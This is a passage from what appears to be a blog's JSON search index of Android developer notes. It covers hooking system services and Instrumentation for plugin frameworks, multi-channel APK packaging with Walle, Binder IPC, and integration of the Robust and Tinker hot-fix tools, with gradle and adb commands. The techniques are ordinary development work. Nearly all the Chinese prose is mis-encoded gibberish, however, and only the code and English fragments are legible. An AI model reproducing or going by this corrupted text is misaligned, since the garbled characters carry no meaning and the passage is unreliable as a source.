¸å¿ƒï¼Œèƒ½å¤Ÿä»¥ä¸€ä¸ªå®¹å™¨çš„èº«ä»½ï¼ˆç»§æ‰¿è€Œæ¥ï¼‰è½»æ˜“è·å–è¿™äº›å¤–éƒ¨èµ„æºï¼Œä¹Ÿä½¿å¾—åŸºäºUIé¡µé¢çš„å¼€å‘å˜å¾—ç®€å•ã€‚å¦‚æœå¯¹äºActivityThreadæœ‰æ‰€äº†è§£çš„è¯ï¼Œå°±çŸ¥é“Activityçš„ç”Ÿå‘½å‘¨æœŸéƒ½æ˜¯åœ¨è¿™ä¸ªç±»ä¸­å®Œæˆçš„ç®€å•æ¥è¯´åœ¨ContextImplä¸­createActivityContextæ–¹æ³•ä¸­ä½¿ç”¨newçš„æ–¹å¼åˆ›å»ºäº†ä¸€ä¸ªContextImplï¼Œæ•´ä¸ªæµç¨‹å°±æ˜¯ActivityThreadåœ¨åˆ›å»ºä¸€ä¸ªActivityåï¼Œç»™å®ƒä¸æ–­èµ‹å€¼çš„è¿‡ç¨‹ã€‚ContextImplåªæ˜¯ä¸€ä¸ªå„ç§èµ„æºçš„å®¹å™¨ï¼ˆæ¯”å¦‚Resource,Display,PackageInfo,æ„é€ å‡½æ•°é‡Œé¢å¡äº†ä¸€äº›ï¼Œåˆ›å»ºå‡ºæ¥ä¹‹åè¿˜ç»™ä¸€äº›å˜é‡èµ‹äº†å€¼ï¼‰ã€‚ Hook(ä½¿ç”¨Invokcation handlerï¼Œå°†ä¸€ä¸ªæ¥å£çš„è°ƒç”¨åŸæœ¬çš„å®ç°åŒ…æ½ä¸‹æ¥ï¼ŒæŠŠåŸæ¥çš„ç»“æœå ä¸ºå·±æœ‰ï¼ŒåŒæ—¶æ·»åŠ ä¸€äº›è‡ªå·±è¦åšçš„äº‹æƒ…)ä¿®æ”¹getSystemServiceï¼Œæ·»åŠ è‡ªå®šä¹‰åŠŸèƒ½Hookæ‰AMS,åœ¨startActivityé‡Œé¢æ·»åŠ ä¸€äº›ç§è´§ã€‚getSystemServiceæœ€ç»ˆä¼šè¿½æº¯åˆ°SystemServiceRegistry.javaã€‚è¿™é‡Œé¢ç”¨static blockçš„æ–¹å¼åˆå§‹åŒ–äº†å„ç§serviceçš„cache. 1.1 ActivityThreadåšäº†å¾ˆå¤šäº‹onSaveInstanceæ˜¯ä»ActivityThreadçš„callCallActivityOnSaveInstanceStateæ–¹æ³•dispatchä¸‹æ¥çš„ã€‚ 2. Hookä½œä¸ºæ’ä»¶åŒ–çš„åˆ‡å…¥ç‚¹ç»™äº†å¼€å‘è€…ç¯¡æ”¹ç³»ç»Ÿapiå®ç°çš„é€šé“æ¯”å¦‚Hookæ‰å‰ªåˆ‡æ¿SystemService,æ¯”å¦‚åœ¨ActivityManagerServiceè°ƒç”¨IPCæ“ä½œæ—¶æ·»åŠ ç§è´§ 3. Androidå¤šæ¸ é“æ‰“åŒ…çš„å®ç°3.1 å†å²ä¸Šæ›¾ç»æœ‰æ•ˆçš„æ–¹å¼ï¼ŒåŸå§‹æ–¹æ³•å…³äºgradlewæ‰“åŒ…releaseä¹‹å‰ï¼Œå…ˆBuild -&gt; Generate Singed apk åˆ›å»ºä¸€ä¸ªæ–°çš„keystore , å¯†ç è®°ä½ï¼Œkeystoreæ–‡ä»¶ä¿å­˜å¥½ã€‚å…³äºæ‰“åŒ…: æ ¹æ®Android å¤šæ¸ é“æ‰“åŒ…æ¢³ç†Gradle UMeng å¤šæ¸ é“æ‰“åŒ… Android.manifestæ–‡ä»¶æ·»åŠ  &lt;meta-data android:name=&quot;UMENG_CHANNEL&quot; android:value=&quot;${UMENG_CHANNEL_VALUE}&quot; /&gt; appçš„build.gradleä¸­æ·»åŠ android { ... productFlavors { xiaomi { manifestPlaceholders = [UMENG_CHANNEL_VALUE: &quot;xiaomi&quot;] } _360 { manifestPlaceholders = [UMENG_CHANNEL_VALUE: &quot;_360&quot;] } baidu { manifestPlaceholders = [UMENG_CHANNEL_VALUE: &quot;baidu&quot;] } wandoujia { manifestPlaceholders = [UMENG_CHANNEL_VALUE: &quot;wandoujia&quot;] } ... } ... } android { productFlavors { xiaomi {} _360 {} baidu {} wandoujia {} } productFlavors.all { flavor -&gt; flavor.manifestPlaceholders = [UMENG_CHANNEL_VALUE: name] } } æ‰“åŒ…é™¤æ­¤ä¹‹å¤– assemble è¿˜èƒ½å’Œ Product Flavor ç»“åˆåˆ›å»ºæ–°çš„ä»»åŠ¡ï¼ˆassemble + Build Variantsï¼‰ï¼ŒBuild Variants = Build Type + Product Flavor ./gradlew assembleDebug # ä¼šæ‰“åŒ… Debug apk./gradlew assembleRelease # æ‰“åŒ… Release apk./gradlew assembleWandoujiaRelease # æ‰“åŒ… wandoujia Release ç‰ˆæœ¬ï¼Œå¤§å°å†™ä¸æ•æ„Ÿ./gradlew assembleWandoujia # æ­¤å‘½ä»¤ä¼šç”Ÿæˆwandoujiaæ¸ é“çš„Releaseå’ŒDebugç‰ˆæœ¬ ä½†æ˜¯ï¼Œ20ä¸ªæ¸ é“å°±è¦ç¼–è¯‘20æ¬¡ï¼Œè€—æ—¶å†—é•¿ã€‚ 3.2 åœ¨META-INFç›®å½•å†…æ·»åŠ ç©ºæ–‡ä»¶ï¼Œå¯ä»¥ä¸ç”¨é‡æ–°ç­¾ååº”ç”¨ã€‚å·²å¤±æ•ˆæ¯”è¾ƒå‡ºåçš„æœ‰pythonç‰ˆæœ¬çš„ï¼Œå°±æ˜¯å†™äº†ä¸ªç©ºæ–‡ä»¶ for line in channels: target_channel = line.strip() target_apk = output_dir + apk_names[0] + &quot;-&quot; + target_channel+&quot;-&quot;+apk_names[2] + src_apk_extension shutil.copy(src_apk, target_apk) zipped = zipfile.ZipFile(target_apk, &#39;a&#39;, zipfile.ZIP_DEFLATED) empty_channel_file = &quot;META-INF/uuchannel_{channel}&quot;.format(channel = target_channel) //æ‰€ä»¥æ¸ é“å·ç®€å•æ¥è¯´å°±æ˜¯å¾€META-INFé‡Œå†™äº†ä¸€ä¸ª&quot;uuchannel_xiaomi&quot;ä¹‹ç±»çš„æ–‡ä»¶ zipped.write(src_empty_file, empty_channel_file) zipped.close() äº²æµ‹ å…³äºå¤šæ¸ é“æ‰“åŒ…ï¼Œç”±äºæ–°çš„ç­¾åæœºåˆ¶çš„å¼•å…¥ï¼Œä¸Šé¢çš„è¿™ç§æ–¹æ³•æ˜¯ä¼šæŠ¥é”™çš„ã€‚ $ adb install app-release_channel_xiaomi.apkFailed to install app-release_channel_xiaomi.apk: Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES: Failed to collect certificates from /data/app/vmdl185799136.tmp/base.apk: META-INF/CERT.SF indicates /data/app/vmdl185799136.tmp/base.apk is signed using APK Signature Scheme v2, but no such signature was found. Signature stripped?] ç¾å›¢çš„æŠ€æœ¯å›¢é˜Ÿç»™å‡ºäº†ç§‘æ™®ï¼Œ æ–°çš„ç­¾åæ–¹æ¡ˆä¼šåœ¨ZIPæ–‡ä»¶æ ¼å¼çš„ Central Directory åŒºå—æ‰€åœ¨æ–‡ä»¶ä½ç½®çš„å‰é¢æ·»åŠ ä¸€ä¸ªAPK Signing BlockåŒºå—ï¼Œä¸‹é¢æŒ‰ç…§ZIPæ–‡ä»¶çš„æ ¼å¼æ¥åˆ†ææ–°åº”ç”¨ç­¾åæ–¹æ¡ˆç­¾ååçš„APKåŒ…ã€‚æ•´ä¸ªAPKï¼ˆZIPæ–‡ä»¶æ ¼å¼ï¼‰ä¼šè¢«åˆ†ä¸ºä»¥ä¸‹å››ä¸ªåŒºå—ï¼šContents of ZIP entriesï¼ˆfrom offset 0 until the start of APK Signing Blockï¼‰APK Signing BlockZIP Central DirectoryZIP End of Central Directoryæ–°åº”ç”¨ç­¾åæ–¹æ¡ˆçš„ç­¾åä¿¡æ¯ä¼šè¢«ä¿å­˜åœ¨åŒºå—2ï¼ˆAPK Signing Blockï¼‰ä¸­ï¼Œ è€ŒåŒºå—1ï¼ˆContents of ZIP entriesï¼‰ã€åŒºå—3ï¼ˆZIP Central Directoryï¼‰ã€åŒºå—4ï¼ˆZIP End of Central Directoryï¼‰æ˜¯å—ä¿æŠ¤çš„ï¼Œåœ¨ç­¾ååä»»ä½•å¯¹åŒºå—1ã€3ã€4çš„ä¿®æ”¹éƒ½é€ƒä¸è¿‡æ–°çš„åº”ç”¨ç­¾åæ–¹æ¡ˆçš„æ£€æŸ¥ã€‚ 3.3 è¿˜æœ‰å°±æ˜¯å¾€apk(zip)æ–‡ä»¶å°¾éƒ¨æ·»åŠ comment End of central directory recordOffset Bytes Description è¯‘0 4 End of central directory signature = 0x06054b50 æ ¸å¿ƒç›®å½•ç»“æŸæ ‡è®°ï¼ˆ0x06054b50ï¼‰4 2 Number of this disk å½“å‰ç£ç›˜ç¼–å·6 2 Disk where central directory starts æ ¸å¿ƒç›®å½•å¼€å§‹ä½ç½®çš„ç£ç›˜ç¼–å·8 2 Number of central directory records on this disk è¯¥ç£ç›˜ä¸Šæ‰€è®°å½•çš„æ ¸å¿ƒç›®å½•æ•°é‡10 2 Total number of central directory records è¯¥ç£ç›˜ä¸Šæ‰€è®°å½•çš„æ ¸å¿ƒç›®å½•æ•°é‡12 4 Size of central directory (bytes) æ ¸å¿ƒç›®å½•çš„å¤§å°16 4 Offset of start of central directory, relative to start of archive æ ¸å¿ƒç›®å½•å¼€å§‹ä½ç½®ç›¸å¯¹äºarchiveå¼€å§‹çš„ä½ç§»20 2 Comment length (n) æ³¨é‡Šé•¿åº¦ (n)22 n Comment æ³¨é‡Šå†…å®¹ apk é»˜è®¤æƒ…å†µä¸‹æ²¡æœ‰commentï¼Œæ‰€ä»¥ comment lengthçš„short ä¸¤ä¸ªå­—èŠ‚ä¸º 0ï¼Œæˆ‘ä»¬éœ€è¦æŠŠè¿™ä¸ªå€¼ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„commentçš„é•¿åº¦ï¼Œç„¶åæŠŠcommentè¿½åŠ åˆ°åè¾¹å³å¯ã€‚Android N ä¸­æåˆ°äº† APK Signature Scheme v2ï¼Œè¿™ç§æ–°å¼•å…¥çš„ç­¾åæœºåˆ¶ï¼Œä¼šå¯¹æ•´ä¸ªæ–‡ä»¶çš„æ¯ä¸ªå­—èŠ‚éƒ½ä¼šåšæ ¡éªŒï¼ŒåŒ…æ‹¬ comment åŒºåŸŸã€‚æ‰€ä»¥åˆ°æ—¶å€™å¦‚æœappä½¿ç”¨æ–°ç‰ˆæœ¬çš„ç­¾åå·¥å…·çš„æ—¶å€™ï¼Œå¦‚æœå¯ç”¨ scheme v2ï¼Œé‚£ä¹ˆè¿™ä¸ªæœºåˆ¶åˆ™ä¸èƒ½å·¥ä½œã€‚ç›®å‰çœ‹ä»£ç ï¼Œæ˜¯å¯ä»¥disable v2 çš„ã€‚ è™½ç„¶ç›®å‰æš‚æ—¶è¿˜æ˜¯å¯ä»¥disable APK Signature Scheme v2çš„ã€‚ signingConfigs { release { v2SigningEnabled false } } 3.3 å½“å‰æ¯”è¾ƒåˆé€‚çš„æ–¹æ¡ˆæ˜¯ä½¿ç”¨ç¾å›¢çš„walleSignature Scheme v2çš„å‡ºç°è®©ç›®å‰ç¾å›¢çš„walleæˆä¸ºå…¬å¼€å·²çŸ¥çš„å¤šæ¸ é“æ‰“åŒ…çš„æœ€å¥½é€‰æ‹©è¿˜æœ‰ä¸€ä¸ªå¼€æºçš„gradle pluginæ®è¯´ä¹Ÿæ”¯æŒV2ç­¾åæ¨¡å¼ ç¾å›¢çš„walleæ¥å…¥æŒ‡å—,åŸç†éƒ½åœ¨æ–°ä¸€ä»£å¼€æºAndroidæ¸ é“åŒ…ç”Ÿæˆå·¥å…·Walle æœ‰äººç»™å‡ºäº†Androidå¤šæ¸ é“æ‰“åŒ…çš„è¿›åŒ–å²ï¼Œå¾ˆæœ‰æ„æ€ ç»“è®ºå°±æ˜¯ å»ºè®®é€šè¿‡ä¿®æ”¹zipæ‘˜è¦çš„æ–¹å¼ç”Ÿæˆæ¸ é“åŒ… ä¸ºä»€ä¹ˆ Android è¦é‡‡ç”¨ Binder ä½œä¸º IPC æœºåˆ¶ï¼Ÿ ä¼ ç»Ÿçš„è¿›ç¨‹é—´é€šä¿¡æ–¹å¼æœ‰ç®¡é“ï¼Œæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå…±äº«å†…å­˜ç­‰ï¼Œå…¶ä¸­ç®¡é“ï¼Œæ¶ˆæ¯é˜Ÿåˆ—é‡‡ç”¨å­˜å‚¨-è½¬å‘æ–¹å¼ï¼Œå³æ•°æ®å…ˆä»å‘é€æ–¹ç¼“å­˜åŒºæ‹·è´åˆ°å†…æ ¸å¼€è¾Ÿçš„ç¼“å­˜åŒºä¸­ï¼Œç„¶åå†ä»å†…æ ¸ç¼“å­˜åŒºæ‹·è´åˆ°æ¥æ”¶æ–¹ç¼“å­˜åŒºï¼Œè‡³å°‘æœ‰ä¸¤æ¬¡æ‹·è´è¿‡ç¨‹ã€‚å…±äº«å†…å­˜è™½ç„¶æ— éœ€æ‹·è´ï¼Œä½†æ§åˆ¶å¤æ‚ï¼Œéš¾ä»¥ä½¿ç”¨ã€‚socketä½œä¸ºä¸€æ¬¾é€šç”¨æ¥å£ï¼Œå…¶ä¼ è¾“æ•ˆç‡ä½ï¼Œå¼€é”€å¤§ï¼Œä¸»è¦ç”¨åœ¨è·¨ç½‘ç»œçš„è¿›ç¨‹é—´é€šä¿¡å’Œæœ¬æœºä¸Šè¿›ç¨‹é—´çš„ä½é€Ÿé€šä¿¡ã€‚Binderé€šè¿‡å†…å­˜æ˜ å°„çš„æ–¹å¼ï¼Œä½¿æ•°æ®åªéœ€è¦åœ¨å†…å­˜è¿›è¡Œä¸€æ¬¡è¯»å†™è¿‡ç¨‹ã€‚å†…å­˜æ˜ å°„ï¼Œç®€è€Œè¨€ä¹‹å°±æ˜¯å°†ç”¨æˆ·ç©ºé—´çš„ä¸€æ®µå†…å­˜åŒºåŸŸæ˜ å°„åˆ°å†…æ ¸ç©ºé—´ï¼Œæ˜ å°„æˆåŠŸåï¼Œç”¨æˆ·å¯¹è¿™æ®µå†…å­˜åŒºåŸŸçš„ä¿®æ”¹å¯ä»¥ç›´æ¥åæ˜ åˆ°å†…æ ¸ç©ºé—´ï¼Œç›¸åï¼Œå†…æ ¸ç©ºé—´å¯¹è¿™æ®µåŒºåŸŸçš„ä¿®æ”¹ä¹Ÿç›´æ¥åæ˜ ç”¨æˆ·ç©ºé—´ã€‚é‚£ä¹ˆå¯¹äºå†…æ ¸ç©ºé—´&lt;â€”-&gt;ç”¨æˆ·ç©ºé—´ä¸¤è€…ä¹‹é—´éœ€è¦å¤§é‡æ•°æ®ä¼ è¾“ç­‰æ“ä½œçš„è¯æ•ˆç‡æ˜¯éå¸¸é«˜çš„ã€‚ sharedPreferenceä¸æ”¯æŒè·¨è¿›ç¨‹ï¼Œå»ºè®®ä½¿ç”¨ContentProviderè¿™ç§ Context.MODE_MULTI_PROCESSThis constant was deprecated in API level 23. MODE_MULTI_PROCESS does not work reliably in some versions of Android, and furthermore does not provide any mechanism for reconciling concurrent modifications across processes. Applications should not attempt to use it. Instead, they should use an explicit cross-process data management approach such as ContentProvider. å¬è¯´ä½ Binderæœºåˆ¶å­¦çš„ä¸é”™ï¼Œæ¥é¢è¯•ä¸‹è¿™å‡ ä¸ªé—®é¢˜ Clientå‘èµ·IPCè¯·æ±‚ï¼Œæ˜¯é˜»å¡çš„å—ï¼Ÿè¿™ä¸ªè¦çœ‹äº†ï¼Œåæ­£startActivityå’Œfinishè¿™ç§éƒ½ä¸æ˜¯ adb getEvent sendEventinput tap x yinput touchescreeninput text helloworldinput keyevent Xposedçš„ä»‹ç»ä¸å…¥é—¨Xposedçš„åŸç†ä¸MultidexåŠåŠ¨æ€åŠ è½½é—®é¢˜ ç»„ä»¶åŒ–ã€æ’ä»¶åŒ–ç»„ä»¶åŒ–ã€æ’ä»¶åŒ–çš„å‰æå°±æ˜¯è§£è€¦ åœ¨Androidä¸­æ‰§è¡ŒshellæŒ‡ä»¤æ»´æ»´çš„virtualAppã€‚ ç›®å‰çœ‹æ¥å°±æ˜¯ç”¨android.content.pm.PackageParseå»è§£æä¸€ä¸ªapkæ–‡ä»¶ï¼Œå°è£…æˆä¸€ä¸ªLoadedPluginå¯¹è±¡ï¼ˆCacheä¸‹æ¥ï¼‰ï¼Œåç»­è°ƒç”¨apkä¸­æè¿°çš„åŠŸèƒ½è¿›è¡Œæ“ä½œã€‚æ‰€ä»¥åº”è¯¥è¿˜æ˜¯åœ¨hostçš„è¿›ç¨‹ä¸­è·‘çš„ã€‚ç”±æ­¤è”ç³»åˆ°PackageInstaller åŸç†ç®€è¿° ç»„ä»¶åŒ–çš„æ–¹æ¡ˆå¤šä¸ºè·¯ç”± + æ¥å£ä¸‹æ²‰çš„æ–¹å¼ï¼Œæ‰€æœ‰æ¥å£ä¸‹æ²‰åˆ°baseä¸­ï¼Œç»„ä»¶ä¸­å®ç°æ¥å£ å¤šæ¸ é“çš„è¯è¿™æ ·çš„å‘½ä»¤è¦è·‘å¤šæ¬¡ä½¿ç”¨walleå°±å¥½äº†,åœ¨project çš„ build.gradle æ·»åŠ : dependencies { classpath &#39;com.meituan.android.walle:plugin:1.0.3&#39; } app/build.gradle æ·»åŠ ï¼š apply plugin: &#39;walle&#39; dependencies { ... compile &#39;com.meituan.android.walle:library:1.0.3&#39; } åœ¨å·¥ç¨‹ç›®å½•ä¸‹åˆ›å»º channel æ–‡ä»¶ï¼š meituan # ç¾å›¢ samsungapps #ä¸‰æ˜Ÿ hiapk anzhi xiaomi # å°ç±³ 91com gfan appchina nduoa 3gcn mumayi 10086com wostore 189store lenovomm hicloud meizu wandou # Google Play # googleplay # ç™¾åº¦ baidu # # 360 360cn # # åº”ç”¨å® myapp ç¼–è¯‘å…¨éƒ¨æ¸ é“gradlew clean assembleReleaseChannelsgradlew clean assembleReleaseChannels -PchannelList=huawei // åªç¼–è¯‘åä¸ºçš„gradlew clean assembleReleaseChannels -PchannelList=huawei,xiaomi // å°ç±³è·Ÿåä¸ºçš„ ä»¥ä¸Šäº²æµ‹é€šè¿‡ï¼ŒåŸæœ¬è£…çš„jdk 9ï¼Œä¸€ç›´æŠ¥é”™ã€‚åœ¨java homeé‡Œæ¢æˆjdk 1.8åï¼Œå°±æ²¡ä»€ä¹ˆé—®é¢˜äº†ã€‚æœ‰é—®é¢˜gradlewçš„æ—¶å€™åé¢è·Ÿä¸Šâ€“stacktraceï¼Œå‡ºé”™äº†ç²˜è´´åˆ°googleé‡Œå°±å¥½äº†ã€‚ åœ¨javaä»£ç ä¸­è·å–æ¸ é“ä¿¡æ¯ String channel = WalleChannelReader.getChannel(this.getApplicationContext()); å…³äºç¾å›¢çš„çƒ­ä¿®å¤æ–¹æ¡ˆï¼Œäº²æµ‹å¯ç”¨ï¼Œç”Ÿæˆçš„patch.jaræ–‡ä»¶å¤§å°5.0kB(æ”¹äº†ä¸ªæ–¹æ³•)ç¾å›¢çš„çƒ­ä¿®å¤å«Robust æŒ‰ç…§å®˜æ–¹wikiåœ¨build.gradleä¸­æ·»åŠ éœ€è¦çš„ä¾èµ–ã€‚è¿˜æœ‰ä¸€ä¸ªrobust.xmlæ–‡ä»¶ï¼ŒæŠŠpackageNameå’ŒpatchPackageNameæ”¹æˆè‡ªå·±çš„ï¼Œçœ‹ä¸‹åˆ«çš„é…ç½®ï¼Œæ³¨é‡Šéƒ½å¾ˆæ¸…æ¥š å…ˆæ‰“releaseåŒ…ï¼Œè®°å¾—å¼€proguradã€‚gradlew clean assembleRelease â€“stacktrace åœ¨activityé‡Œé¢æ”¾ä¸€ä¸ªbutton,åœ¨onClickçš„æ—¶å€™loadPatch.è®°å¾—PatchManipulateImplé‡Œé¢å†™çš„setPatchesImfoImplClassFullNameè¦å’Œroubust.xmlé‡Œé¢å†™çš„ä¸€æ · åœ¨activityé‡Œé¢ä¿®æ”¹çš„ä»£ç æ·»åŠ @mofidyæ³¨è§£ï¼Œ@Addä½œä¸ºæ–°åŠ çš„æ–¹æ³•çš„æ³¨è§£ å¼€å§‹æ‰“è¡¥ä¸åŒ….åœ¨gradleä¸­æ³¨é‡Šæ‰apply plugin: â€˜robustâ€™ï¼Œå¼€å¯apply plugin: â€˜auto-patch-pluginâ€™ã€‚æŠŠapp/build/outputs/mappings/mapping.txtæ–‡ä»¶å’Œapp/build/outputs/robust/methodsMap.robustè¿™ä¸¤ä¸ªæ–‡ä»¶ç²˜è´´åˆ°app/robustæ–‡ä»¶å¤¹ä¸­ã€‚é‡æ–°æ‰“releaseåŒ…ï¼šgradlew clean assembleRelease â€“stacktraceã€‚æŠ¥é”™æ˜¯æ­£å¸¸çš„ã€‚ åœ¨app/build/outputs/robustæ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°patch.jaræ–‡ä»¶ã€‚ adb push app/build/outputs/robust/patch.jar /sdcard/robust/patch.jar è¿›Activityï¼Œç‚¹å‡»é‚£ä¸ªloadPathçš„æŒ‰é’®ï¼Œå°±æ˜¯å»åˆšæ‰adb pushçš„è·¯å¾„å»åŠ è½½è¿™ä¸ªpatchï¼ˆå½“ç„¶ç”Ÿäº§ç¯å¢ƒåº”è¯¥æ˜¯æ­å»ºhttpsæœåŠ¡äº†ï¼‰ã€‚ æ’ä»¶åŒ–å¼€å‘smallè§£é‡Šäº†åŠ¨æ€æ³¨å†Œactivityçš„åŸç†:appæ‰€åœ¨è¿›ç¨‹startActivityä¼šé€šè¿‡Instrumentationçš„execStartActivityæ–¹æ³•å‘system_serverè¿›ç¨‹çš„activityManagerServiceå‘èµ·è¯·æ±‚ï¼Œåœ¨è¿™é‡Œè¦å°†æ’ä»¶activityçš„åç§°æ¢æˆä¹‹å‰å†™åœ¨manifestä¸­çš„åç§°ã€‚system_serverå®Œæˆå¯åŠ¨Activityä¼šå›è°ƒåˆ°Instrumentationçš„newActivityæ–¹æ³•ï¼Œåœ¨è¿™é‡Œå¯ä»¥å°†manifestä¸­çš„åç§°è¿˜åŸæˆæ’ä»¶çš„activityåç§°ã€‚ ActivityThread thread = currentActivityThread(); Instrumentation base = thread.@mInstrumentation; Instrumentation wrapper = new InstrumentationWrapper(base); thread.@mInstrumentation = wrapper; class InstrumentationWrapper extends Instrumentation { public ActivityResult execStartActivity(..., Intent intent, ...) { fakeToStub(intent); //è¿™é‡Œåœ¨intenté‡Œé¢æ”¾ä¸ªclassNameå°±å¥½äº† base.execStartActivity(args); } @Override public Activity newActivity(ClassLoader cl, String className, Intent intent) { className = restoreToReal(intent, className); //è¿™é‡Œä»intentä¸­è¯»å–classNameå°±å¥½äº† return base.newActivity(cl, className, intent); } } sharedUidé€šè¿‡Shared User id,æ‹¥æœ‰åŒä¸€ä¸ªUser idçš„å¤šä¸ªAPKå¯ä»¥é…ç½®æˆè¿è¡Œåœ¨åŒä¸€ä¸ªè¿›ç¨‹ä¸­.æ‰€ä»¥é»˜è®¤å°±æ˜¯å¯ä»¥äº’ç›¸è®¿é—®ä»»æ„æ•°æ®ã€‚ åœ¨windowså¹³å°ä¸Šï¼Œgradleä¸‹è½½çš„ç¼“å­˜æ–‡ä»¶ä½ç½®åœ¨å“ªé‡Œï¼Ÿ æœ€åå¼•ç”¨ç§»åŠ¨å¼€å‘çš„ç½—æ›¼è’‚å…‹æ¶ˆäº¡å² | InfoQä¸­çš„ä¸€æ®µè¯ æ’ä»¶åŒ–å’Œçƒ­æ›´æ–°æŠ€æœ¯æ˜¯çœŸçš„ä¸å¯é¿å…çš„è¡°è½äº†ï¼Œå®ƒä»¬å·²ç»é”™è¿‡äº†å†å²æœºé‡æœŸï¼Œæ–°çš„æŠ€æœ¯å·²ç»ä»å¦ä¸€ä¸ªç»´åº¦å®æ–½äº†é™ç»´æ‰“å‡»ï¼Œæ²¡é”™ï¼Œè¯´çš„å°±æ˜¯å°ç¨‹åºã€‚ å‚è€ƒåˆ†æDroidPluginï¼Œæ·±å…¥ç†è§£æ’ä»¶åŒ–æ¡†æ¶é€†å‘å¤§å…¨Android HookæŠ€æœ¯é˜²èŒƒæ¼«è°ˆçˆ±å¥‡è‰ºç»„ä»¶åŒ–æ¢ç´¢ä¹‹åŸç†ç¯‡Atlaså®¹å™¨æ¡†æ¶","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"æ’ä»¶åŒ–","slug":"æ’ä»¶åŒ–","permalink":"https://haldir65.github.io/tags/æ’ä»¶åŒ–/"}]},{"title":"é›†æˆTinkerçš„ä¸€äº›è®°å½•","date":"2017-11-18T17:25:29.000Z","path":"2017/11/18/2017-11-18-integrating-tinker/","text":"å…³äºAndroid Applicationé›†æˆTinkerçš„ä¸€æ¬¡è®°å½•ã€‚ 1. é¦–å…ˆä»å®˜æ–¹Demoé¡¹ç›®å¼€å§‹Tinkeræ˜¯2016å¹´å¼€æºçš„ï¼Œå…ˆç›´æ¥cloneä¸‹æ¥ã€‚æˆ‘çš„ç¯å¢ƒï¼š Android Studio 3.0 ç¨³å®šç‰ˆgradleç‰ˆæœ¬ï¼šdistributionUrl=https\\://services.gradle.org/distributions/gradle-4.1-all.zipgradleæ’ä»¶ç‰ˆæœ¬: classpath â€˜com.android.tools.build:gradle:3.0.0â€™TINKER_VERSION=1.9.1compileSdkVersion 26buildToolsVersion â€˜26.0.2â€™ Android Studio 3.0 å› ä¸ºåˆšå‡ºæ¥ï¼Œæ‰€ä»¥é‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œä¸è¿‡å¥½åœ¨Googleä¸€ä¸‹æˆ–è€…åœ¨issueé‡Œé¢æŸ¥ä¸€ä¸‹ï¼Œéƒ½èƒ½æ‰¾åˆ°åˆé€‚çš„è§£ç­” å®˜æ–¹Demoå…ˆæŠŠå®˜æ–¹DemoæŒ‰ç…§æ™®é€šAppçš„æµç¨‹å®‰è£…ä¸Šæ¥ã€‚è¿™æ—¶å€™åœ¨app/build/bakApk/ç›®å½•ä¸‹å°±ä¼šå‡ºç°â€œapp-debug-1118-15-50-07.apkâ€è¿™æ ·çš„æ–‡ä»¶ï¼Œå…¶å®æ˜¯å¤åˆ¶äº†ä¸€ä»½å½“å‰çš„apk ç„¶åï¼Œåœ¨MainActivityä»£ç ä¸­ï¼ŒæŠŠåŸæœ¬æ³¨é‡Šæ‰çš„ä¸€è¡ŒLogå–æ¶ˆæ³¨é‡Šï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤ gradlew tinkerPatchDebugæˆ–è€…åœ¨Andriod Studioçš„Gradle tabé‡Œé¢æ‰¾åˆ°è¿™ä¸ªtaskï¼Œè¿è¡Œä¸€ä¸‹ æ‰“releasePatchå…¶å®ä¹Ÿå·®ä¸å¤š gradlew tinkerRelease ä¸€åˆ‡é¡ºåˆ©çš„è¯ï¼Œåœ¨app/build/outputs/apk/tinkerPatch/debugæ–‡ä»¶å¤¹ä¸‹å°±ä¼šçœ‹åˆ°ä¸€äº›æ–°ç”Ÿæˆçš„æ–‡ä»¶ï¼Œä¾‹å¦‚â€œapp/build/outputs/apk/tinkerPatch/debug/patch_signed.apkâ€ï¼Œâ€œapp/build/outputs/apk/tinkerPatch/debug/patch_signed_7zip.apkâ€ç­‰ç­‰ï¼Œå…·ä½“æ¯ä¸ªæ–‡ä»¶æ˜¯å¹²å˜›çš„æ–‡æ¡£ä¸Šéƒ½è¯´äº†ã€‚è¿™æ—¶å€™é€šè¿‡adb pushå‘½ä»¤æŠŠè¿™ä¸ª7zipæ–‡ä»¶ä¸Šä¼ åˆ°æ‰‹æœºæ ¹ç›®å½•ä¸‹ adb push ./app/build/outputs/tinkerPatch/debug/patch_signed_7zip.apk /storage/sdcard0/patch_signed_7zip.apkæˆ–è€…åœ¨Android Studio 3.0å³ä¸‹è§’æœ‰ä¸€ä¸ªDevice File Explorer,æŠŠè¿™ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°æ‰‹æœºé‡Œ ä¸Šé¢é‚£ä¸ªè·¯å¾„ä¸ä¸€å®šå‡†ï¼Œæ€»ä¹‹éœ€è¦å’Œè¿™é‡Œé¢çš„è·¯å¾„ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘åœ¨æ¨¡æ‹Ÿå™¨é‡Œé¢æ˜¯sdcard/emulated/0è¿™ä¸ªç›®å½•ä¸‹ TinkerInstaller.onReceiveUpgradePatch(getApplicationContext(), Environment.getExternalStorageDirectory().getAbsolutePath() + &quot;/patch_signed_7zip.apk&quot;); ä¸Šä¼ å®Œæ¯•ä¹‹åï¼Œåœ¨å½“å‰é¡µé¢ç‚¹å‡»Buttonï¼Œç‚¹å‡»äº‹ä»¶è°ƒç”¨åˆ°ä¸Šé¢è¿™ä¸€è¡Œä»£ç .ä¸€åˆ‡Okçš„è¯ï¼ˆè¿æ°”å¥½çš„è¯ï¼‰ï¼Œä¼šå‡ºç°Toast,å…¶å®è¿™ä¸ªToastæ˜¯åœ¨SampleResultServiceï¼ˆä¸€ä¸ªIntentServiceï¼‰é‡Œé¢å†™çš„ï¼Œä¹Ÿå°±æ˜¯è¯´Patchæ‰“ä¸Šçš„è¯ï¼Œå¼€å‘è€…å¯ä»¥è‡ªå®šä¹‰ä¸€äº›UIäº‹ä»¶ã€‚ è¿™æ—¶å€™å†Kill Porcess,æ®è¯´é”å±ä¹Ÿè¡Œï¼Ÿé‡æ–°å¯åŠ¨åï¼Œåˆšæ‰å–æ¶ˆæ³¨é‡Šçš„é‚£ä¸€è¡Œä»£ç å°±åœ¨logcaté‡Œé¢å‡ºç°äº†ã€‚ 